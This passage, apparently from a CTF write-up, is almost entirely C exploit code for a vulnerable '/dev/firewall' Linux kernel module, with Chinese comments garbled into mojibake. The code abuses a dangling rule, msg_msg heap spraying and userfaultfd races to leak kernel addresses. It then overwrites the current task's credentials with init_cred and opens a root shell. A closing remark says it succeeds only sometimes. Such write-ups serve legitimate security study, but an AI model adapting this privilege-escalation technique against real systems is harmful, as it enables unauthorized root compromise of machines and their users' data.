<span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">uint64_t</span> fault_page, <span class="keyword">uint64_t</span> fault_page_len, <span class="keyword">void</span> *(*func)(<span class="keyword">void</span> *), <span class="keyword">pthread_t</span> *thr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">  <span class="comment">// pthread_t thr;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  ua.api = UFFD_API;</span><br><span class="line">  ua.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">  ur.range.len   = fault_page_len;</span><br><span class="line">  ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);  </span><br><span class="line">  <span class="keyword">int</span> s = pthread_create(thr, <span class="literal">NULL</span>, func, (<span class="keyword">void</span>*)uffd); </span><br><span class="line">  <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// handler1(): put forged data on (page_1+0x1000), QID #2&#x27;s msg.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_msg</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_msg created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// è¿™ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°copy_from_user/copy_to_userè®¿é—®FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1)) <span class="comment">// ä»uffdè¯»å–msgç»“æ„ï¼Œè™½ç„¶æ²¡ç”¨</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page1 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] page fault 1 at page1+0x1000\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>];  <span class="comment">// é¢„å…ˆè®¾ç½®å¥½bufferå†…å®¹ï¼Œå¾€ç¼ºé¡µå¤„è¿›è¡Œæ‹·è´</span></span><br><span class="line">      <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      msg_header fake_msg_header;</span><br><span class="line">      fake_msg_header.m_type = <span class="number">1</span>;</span><br><span class="line">      fake_msg_header.m_ts   = <span class="number">0x1000</span>;</span><br><span class="line">      fake_msg_header.next   = current_task+<span class="number">0x538</span><span class="number">-0x8</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(buffer+<span class="number">0xfd0</span><span class="number">-0x8</span>, (<span class="keyword">void</span> *)&amp;fake_msg_header, <span class="keyword">sizeof</span>(msg_header));  <span class="comment">// msg_msgseg.next - 8 bytes (we should skip this 8 bytes)</span></span><br><span class="line">    <span class="comment">//   memset(buffer,0x61,0x2000);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page1+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//   printf(&quot;asdf\n&quot;);</span></span><br><span class="line">          <span class="keyword">if</span> (is_write_msg)</span><br><span class="line">          &#123;</span><br><span class="line">              ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// æ¢å¤æ‰§è¡Œcopy_from_user</span></span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;write msg ok\n&quot;</span>);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_task</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_task created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// è¿™ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°copy_from_user/copy_to_userè®¿é—®FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1))  <span class="comment">// ä»uffdè¯»å–msgç»“æ„ï¼Œè™½ç„¶æ²¡ç”¨</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page2 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+] page fault 2 at page2+0x1000\n&quot;</span>);</span><br><span class="line">      is_write_msg = <span class="number">1</span>;                                <span class="comment">// wait for page fault 1</span></span><br><span class="line">      sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//   pthread_join(td[0],NULL);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] msg next write is ok\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>]; </span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>)=init_cred;</span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>)=init_cred;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page2+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// æ¢å¤æ‰§è¡Œcopy_from_user</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write task ok\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;33m debug\e[0m\n&quot;</span>);</span><br><span class="line">    add_rule(fd,<span class="number">3</span>,INBOUND);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_current_task</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    <span class="keyword">char</span> re_buf[<span class="number">0x2000</span>];</span><br><span class="line">    current_task=init_task;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    </span><br><span class="line">    fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">    prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        current_task=prev_task;</span><br><span class="line">        fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">        prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg_next</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page1+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page1+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x2000</span><span class="number">-0x8</span><span class="number">-0x30</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg</span><span class="params">()</span></span>&#123;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page2+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_page_msg\n&quot;</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page2+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    user_msg *msg=(user_msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page1=(<span class="keyword">char</span> *)mmap(<span class="number">0x200000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    page2=(<span class="keyword">char</span> *)mmap(<span class="number">0x300000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>((!page1)||(!page2))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    register_userfault(page1+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_msg,&amp;td[<span class="number">0</span>]);</span><br><span class="line">    register_userfault(page2+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_task,&amp;td[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        add_rule(fd,i,INBOUND);</span><br><span class="line">    &#125;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(re_buf[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] %p\n&quot;</span>,re_buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_current_task();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m current_task_addr:%p \e[0m\n&quot;</span>,current_task);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.å…ˆé‡‹æ”¾4Kçš„msg</span></span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1fc8</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.ç„¶å¾Œå†æŠŠä»–å€‘ç”³è«‹å›ä¾†,ä¸¦ä¸”é€šéuserfaultå¡ä½</span></span><br><span class="line">    </span><br><span class="line">    pthread_create(&amp;td[<span class="number">2</span>],<span class="literal">NULL</span>,get_page_msg_next,<span class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//3.ç„¶å¾Œå†æŠŠmsgçš„æ®µé€šéæˆ‘å€‘æ§åˆ¶çš„msgçµ¦é‡‹æ”¾æ‰</span></span><br><span class="line">    fake_msg_header.ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header.next=page_msg;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="comment">//4.ç„¶å¾Œå†æŠŠé‡‹æ”¾æ‰çš„msgçš„æ®µç”³è«‹å›ä¾†ï¼Œé€™æ¬¡ä»–æ˜¯msgäº†,ä¸¦ä¸”å†æ¬¡é€šéuserfaultå¡ä½</span></span><br><span class="line">    pthread_create(&amp;td[<span class="number">3</span>],<span class="literal">NULL</span>,get_page_msg,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">0</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">1</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">2</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">3</span>],<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰æ¦‚ç‡æˆåŠŸï¼Œä¸»è¦æ˜¯è¶Šç•Œè¯»çš„slabçš„å†…å®¹ä¸å¯æ§ï¼Œå¯èƒ½èƒ½è¯»åˆ°å¯èƒ½è¯»ä¸åˆ°ï¼Œåº”è¯¥å’Œslabçš„freelistçš„éšæœºåŒ–æœ‰å…³ã€‚</p>
